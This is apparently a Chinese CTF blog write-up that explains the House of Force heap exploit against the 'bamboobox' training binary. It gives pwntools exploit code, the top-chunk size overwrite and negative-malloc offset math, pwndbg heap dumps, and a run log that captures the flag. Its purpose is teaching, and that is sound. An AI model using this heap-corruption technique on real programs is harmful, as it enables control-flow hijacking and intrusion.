<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">cmd</span><span class="hljs-params">(choice)</span>:<br>  p.<span class="hljs-title function_">sendlineafter</span><span class="hljs-params">(<span class="hljs-string">'',str(choice))</span></span><br><span class="hljs-string"><span class="hljs-params">  </span></span><br><span class="hljs-string"><span class="hljs-params">def create(size,content):</span></span><br><span class="hljs-string"><span class="hljs-params">  cmd(2)</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>item name:<span class="hljs-string">',str(size))</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>item:<span class="hljs-string">',content)</span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">def edit(index,size,content):</span></span><br><span class="hljs-string"><span class="hljs-params">  cmd(3)</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>of item:<span class="hljs-string">',str(index))</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>item name:<span class="hljs-string">',str(size))</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>the item:<span class="hljs-string">',content)</span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">def delete(index):</span></span><br><span class="hljs-string"><span class="hljs-params">  cmd(4)</span></span><br><span class="hljs-string"><span class="hljs-params">  p.sendlineafter('</span>of item:<span class="hljs-string">',str(index))</span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">def quit():</span></span><br><span class="hljs-string"><span class="hljs-params">  cmd(5)</span></span><br></code></pre></td></tr></tbody></table></figure>

<p>首先来看第一部分的payload，这些代码的主要功能是自动化执行程序的功能。也是exp中最基础的部分，没有什么好说的。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">create(<span class="hljs-number">0x30</span>, <span class="hljs-string">"aaaa"</span>)<br></code></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; vmmap<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>          <span class="hljs-number">0x400000</span>           <span class="hljs-number">0x402000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox<br>          <span class="hljs-number">0x601000</span>           <span class="hljs-number">0x602000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">1000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox<br>          <span class="hljs-number">0x602000</span>           <span class="hljs-number">0x603000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">2000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox<br>          <span class="hljs-number">0x603000</span>           <span class="hljs-number">0x624000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap]<br>    <span class="hljs-number">0x7ffff7a0d000</span>     <span class="hljs-number">0x7ffff7bcd000</span> r-xp   <span class="hljs-number">1</span>c0000 <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7bcd000</span>     <span class="hljs-number">0x7ffff7dcd000</span> ---p   <span class="hljs-number">200000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dcd000</span>     <span class="hljs-number">0x7ffff7dd1000</span> r--p     <span class="hljs-number">4000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd1000</span>     <span class="hljs-number">0x7ffff7dd3000</span> rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd3000</span>     <span class="hljs-number">0x7ffff7dd7000</span> rw-p     <span class="hljs-number">4000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7dd7000</span>     <span class="hljs-number">0x7ffff7dfd000</span> r-xp    <span class="hljs-number">26000</span> <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7fdc000</span>     <span class="hljs-number">0x7ffff7fdf000</span> rw-p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7ff7000</span>     <span class="hljs-number">0x7ffff7ffa000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      [vvar]<br>    <span class="hljs-number">0x7ffff7ffa000</span>     <span class="hljs-number">0x7ffff7ffc000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      [vdso]<br>    <span class="hljs-number">0x7ffff7ffc000</span>     <span class="hljs-number">0x7ffff7ffd000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffd000</span>     <span class="hljs-number">0x7ffff7ffe000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffe000</span>     <span class="hljs-number">0x7ffff7fff000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffffffde000</span>     <span class="hljs-number">0x7ffffffff000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [<span class="hljs-built_in">stack</span>]<br><span class="hljs-number">0xffffffffff600000</span> <span class="hljs-number">0xffffffffff601000</span> r-xp     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      [vsyscall]<br><br></code></pre></td></tr></tbody></table></figure>

<p>执行完上面的payload之后堆块的状况如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0xe80000</span><br><span class="hljs-number">0xe80000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0xe80010</span>:	<span class="hljs-number">0x0000000000400896</span>	<span class="hljs-number">0x00000000004008b1</span><br>    		#hello_message      #goodbye_message<br><span class="hljs-number">0xe80020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000041</span> #chunk0（<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)）<br><span class="hljs-number">0xe80030</span>:	<span class="hljs-number">0x0000000a61616161</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020fa1</span> #top_chunk<br><span class="hljs-number">0xe80070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80080</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe80090</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800a0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800b0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800c0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800d0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xe800e0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<p>然后我们编辑刚才创建的堆块（index0）：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">content=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">'1'</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>,content)<br></code></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0xe80000</span><br><span class="hljs-number">0xe80000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> #func_start_malloc_chunk<br><span class="hljs-number">0xe80010</span>:	<span class="hljs-number">0x0000000000400896</span>	<span class="hljs-number">0x00000000004008b1</span><br>    		#hello_message      #goodbye_message<br><span class="hljs-number">0xe80020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000041</span> #chunk0（<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)）<br><span class="hljs-number">0xe80030</span>:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80040</span>:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80050</span>:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80060</span>:	<span class="hljs-number">0x3131313131313131</span>	<span class="hljs-number">0xffffffffffffffff</span> #top_chunk<br><span class="hljs-number">0xe80070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0xe800e0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<p>从上面的内容可以看到，top_chunk的size已经被更改为0xffffffffffffffff，利用它我们就可以控制任意内存的地址。继续向下看paylaod：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">offset=-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>create(offset,<span class="hljs-string">'bbbb'</span>)<br></code></pre></td></tr></tbody></table></figure>

<p>这个offset怎么来的？</p>
<p>首先要明确目标为修改goodbye_message函数为magic函数。在gdb调试中，goodbye_message函数指针的地址为：0xe80010，现在的top_chunk地址为0xe80060</p>
<p>要想修改地址，应该将 top_chunk 指向0xe80000（heap_base）处，这样当下次再分配chunk时，就可以分配到goodbye_message处的内存了。</p>
<p>如何计算？本题是向低地址移动，将上一小节的公式带入到本题中：</p>
<p>malloc_size=0xe80000-0xe80060-0x10=-0x70</p>
<p>因此要malloc(-0x70)，完成此步骤之后堆内存如下图所示：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0xe80000</span><br><span class="hljs-number">0xe80000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000059</span> #new_top_chunk<br><span class="hljs-number">0xe80010</span>:	<span class="hljs-number">0x0000000000400896</span>	<span class="hljs-number">0x00000000004008b1</span><br>    		#hello_message      #goodbye_message<br><span class="hljs-number">0xe80020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000041</span> #chunk0（<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)）<br><span class="hljs-number">0xe80030</span>:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80040</span>:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80050</span>:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80060</span>:	<span class="hljs-number">0x3131313131313131</span>	<span class="hljs-number">0xffffffffffffffa1</span> #old_top_chunk<br><span class="hljs-number">0xe80070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0xe800e0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<p>此时已经可以控制goodbye_message的地址，覆盖后退出程序就可以触发magic函数。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">create(<span class="hljs-number">0x10</span>,p64(magic)*<span class="hljs-number">2</span>)<br></code></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0xe80000</span><br><span class="hljs-number">0xe80000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span> #现在已经被控制的chunk<br><span class="hljs-number">0xe80010</span>:	<span class="hljs-number">0x0000000000400d49</span>	<span class="hljs-number">0x0000000000400d49</span><br>    		#hello_message      <span class="hljs-meta">#magic</span><br><span class="hljs-number">0xe80020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000039</span> #chunk0（<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>)）<br><span class="hljs-number">0xe80030</span>:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80040</span>:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80050</span>:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x6161616161616161</span><br><span class="hljs-number">0xe80060</span>:	<span class="hljs-number">0x3131313131313131</span>	<span class="hljs-number">0xffffffffffffffa1</span> #top_chunk<br><span class="hljs-number">0xe80070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0xe800e0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<h3 id="debug-exp"><a href="#debug-exp" class="headerlink" title="debug-exp"></a>debug-exp</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c">➜  ~ cd Desktop/<br>    <span class="hljs-string">'5.exit\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Your choice:'</span><br>[DEBUG] Sent <span class="hljs-number">0x5</span> bytes:<br>    <span class="hljs-string">'bbbb\n'</span><br>[DEBUG] Sent <span class="hljs-number">0x2</span> bytes:<br>    <span class="hljs-string">'2\n'</span><br>[DEBUG] Received <span class="hljs-number">0x117</span> bytes:<br>    <span class="hljs-string">'invaild choice!!!\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Bamboobox Menu\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'1.show the items in the box\n'</span><br>    <span class="hljs-string">'2.add a new item\n'</span><br>    <span class="hljs-string">'3.change the item in the box\n'</span><br>    <span class="hljs-string">'4.remove the item in the box\n'</span><br>    <span class="hljs-string">'5.exit\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Your choice:Please enter the length of item name:'</span><br>[DEBUG] Sent <span class="hljs-number">0x3</span> bytes:<br>    <span class="hljs-string">'16\n'</span><br>[DEBUG] Received <span class="hljs-number">0x1e</span> bytes:<br>    <span class="hljs-string">'Please enter the name of item:'</span><br>[DEBUG] Sent <span class="hljs-number">0x11</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">49</span> <span class="hljs-number">0</span>d <span class="hljs-number">40</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">49</span> <span class="hljs-number">0</span>d <span class="hljs-number">40</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  │I·@·│····│I·@·│····│<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">0</span>a                                                  │·│<br>    <span class="hljs-number">00000011</span><br>[DEBUG] Received <span class="hljs-number">0x1d2</span> bytes:<br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Bamboobox Menu\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'1.show the items in the box\n'</span><br>    <span class="hljs-string">'2.add a new item\n'</span><br>    <span class="hljs-string">'3.change the item in the box\n'</span><br>    <span class="hljs-string">'4.remove the item in the box\n'</span><br>    <span class="hljs-string">'5.exit\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Your choice:invaild choice!!!\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Bamboobox Menu\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'1.show the items in the box\n'</span><br>    <span class="hljs-string">'2.add a new item\n'</span><br>    <span class="hljs-string">'3.change the item in the box\n'</span><br>    <span class="hljs-string">'4.remove the item in the box\n'</span><br>    <span class="hljs-string">'5.exit\n'</span><br>    <span class="hljs-string">'----------------------------\n'</span><br>    <span class="hljs-string">'Your choice:'</span><br>[DEBUG] Sent <span class="hljs-number">0x2</span> bytes:<br>    <span class="hljs-string">'5\n'</span><br>[*] Switching to interactive mode<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br><span class="hljs-number">1.</span>show the items in the box<br><span class="hljs-number">2.</span>add a new item<br><span class="hljs-number">3.</span>change the item in the box<br><span class="hljs-number">4.</span>remove the item in the box<br><span class="hljs-number">5.</span><span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:invaild choice!!!<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br><span class="hljs-number">1.</span>show the items in the box<br><span class="hljs-number">2.</span>add a new item<br><span class="hljs-number">3.</span>change the item in the box<br><span class="hljs-number">4.</span>remove the item in the box<br><span class="hljs-number">5.</span><span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:[*] Process <span class="hljs-string">'./bamboobox'</span> stopped with <span class="hljs-built_in">exit</span> code <span class="hljs-number">0</span> (pid <span class="hljs-number">29277</span>)<br>[DEBUG] Received <span class="hljs-number">0x15</span> bytes:<br>    <span class="hljs-string">'flag{house_of_force}\n'</span><br>flag{house_of_force}<br>[*] Got EOF <span class="hljs-keyword">while</span> reading in interactive<br>$  <br></code></pre></td></tr></tbody></table></figure>

<p>可以看到已经打印出来了 flag</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/13/0ctf_2017_BabyHeap/">← Next 0ctf_2017_BabyHeap</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Einherjar/">House of Einherjar Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Force%EF%BC%88%E6%8E%A7%E5%88%B6top-chunk%EF%BC%89%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">House Of Force（控制top_chunk）（基础）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">Linux环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%BA%90%E4%BB%A3%E7%A0%81-c"><span class="toc-number">1.2.</span> <span class="toc-text">程序源代码(c)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">IDA静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#meau%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.2.</span> <span class="toc-text">meau函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show-item"><span class="toc-number">1.3.3.</span> <span class="toc-text">show_item</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add-item"><span class="toc-number">1.3.4.</span> <span class="toc-text">add_item</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#change-item"><span class="toc-number">1.3.5.</span> <span class="toc-text">change_item</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#remove-item"><span class="toc-number">1.3.6.</span> <span class="toc-text">remove_item</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#magic"><span class="toc-number">1.3.7.</span> <span class="toc-text">magic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.3.8.</span> <span class="toc-text">结构体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwndbg-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">1.4.</span> <span class="toc-text">pwndbg 动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83"><span class="toc-number">1.4.1.</span> <span class="toc-text">堆内存分布</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.4.2.</span> <span class="toc-text">全局变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8Aexp"><span class="toc-number">1.4.3.</span> <span class="toc-text">攻击原理及exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-%E5%88%86%E6%9E%90"><span class="toc-number">1.4.4.</span> <span class="toc-text">payload 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debug-exp"><span class="toc-number">1.4.5.</span> <span class="toc-text">debug-exp</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>